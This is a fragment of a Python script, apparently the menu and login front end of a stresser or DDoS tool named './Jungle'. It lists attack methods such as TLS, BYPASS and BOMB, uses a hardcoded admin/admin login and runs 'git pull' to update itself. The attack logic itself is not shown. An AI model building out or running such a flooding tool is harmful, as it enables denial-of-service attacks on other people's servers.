\033[95m             • TLS [\033[92mVIP\033[95m]
\033[95m             • BYPASS [\033[92mVIP\033[95m]
\033[95m             • BOMB
\033[95m             • MIX [\033[92mVIP\033[95m]
\033[95m             • TLSV2 [\033[92mVIP\033[95m]
\033[95m             • HENTAI [\033[92mVIP\033[95m]
\033[96m         ╚════════════════════════════════════════════════════════╝

            ''')
def login():
    user = "admin"
    passwd = "admin"
    os.system("clear")
    print("")
    username = input("📡 [Username] = ")
    password = getpass.getpass(prompt='📡 [Password] = ')
    if username != user or password != passwd:
        print("")
        print("❌ PASSWORD SALAH")
        sys.exit(1)
    elif username == user and password == passwd:
        print("✅ Welcome to ./Jungle")
        time.sleep(0.5)
        os.system("clear")
        os.system("git pull")
   
if __name__ == "__main__":
    login()
    ascii_vro()
    main()
